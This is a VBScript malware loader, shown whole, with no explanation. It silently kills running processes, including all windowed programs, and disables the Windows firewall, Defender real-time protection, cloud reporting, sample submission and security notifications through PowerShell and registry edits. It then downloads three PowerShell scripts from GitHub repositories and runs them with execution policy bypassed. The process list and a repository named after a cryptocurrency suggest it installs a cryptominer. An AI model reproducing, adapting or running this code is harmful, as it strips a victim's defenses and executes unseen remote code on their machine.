Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -Command Stop-Process -Name 'cmd','powershell','xmrig','chromedriver','msedgedriver' -Force -ErrorAction SilentlyContinue", 0, True
objShell.Run "powershell.exe -Command Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Stop-Process -Force", 0, True
objShell.Run "powershell.exe -Command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False", 0, True
objShell.Run "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true", 0, True
objShell.Run "powershell.exe -Command Set-MpPreference -MAPSReporting Disabled", 0, True
objShell.Run "powershell.exe -Command Set-MpPreference -SubmitSamplesConsent NeverSend", 0, True
objShell.Run "powershell.exe -Command Set-MpPreference -SubmitSamplesConsent 2", 0, True
objShell.Run "powershell.exe -Command reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' /v 'DisableRealtimeMonitoring' /t REG_DWORD /d '1' /f", 0, True
objShell.Run "powershell.exe -Command reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f", 0, True
objShell.Run "powershell.exe -Command reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet' /v 'DisableBlockAtFirstSeen' /t REG_DWORD /d '1' /f", 0, True
objShell.Run "powershell.exe -Command reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f", 0, True
objShell.Run "powershell.exe -Command Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1", 0, True
objShell.Run "powershell.exe -Command Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2", 0, True
objShell.Run "powershell.exe -Command reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications' /v 'ToastEnabled' /t REG_DWORD /d '0' /f", 0, True
objShell.Run "powershell.exe -Command reg add 'HKCU\Software\Policies\Microsoft\Windows Defender Security Center\Notifications' /v 'DisableEnhancedNotifications' /t REG_DWORD /d '1' /f", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/Salvium-SAL-/refs/heads/main/configure_system.ps1 -OutFile C:\Users\Public\Downloads\configure_system.ps1", 0, True
WScript.Sleep 2000
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\configure_system.ps1", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/system/refs/heads/main/sc.ps1 -OutFile C:\Users\Public\Downloads\sc.ps1", 0, True
WScript.Sleep 2000
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\sc.ps1", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/ring.ps1 -OutFile C:\Users\Public\Downloads\ring.ps1", 0, True
WScript.Sleep 2000
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\ring.ps1", 0, True
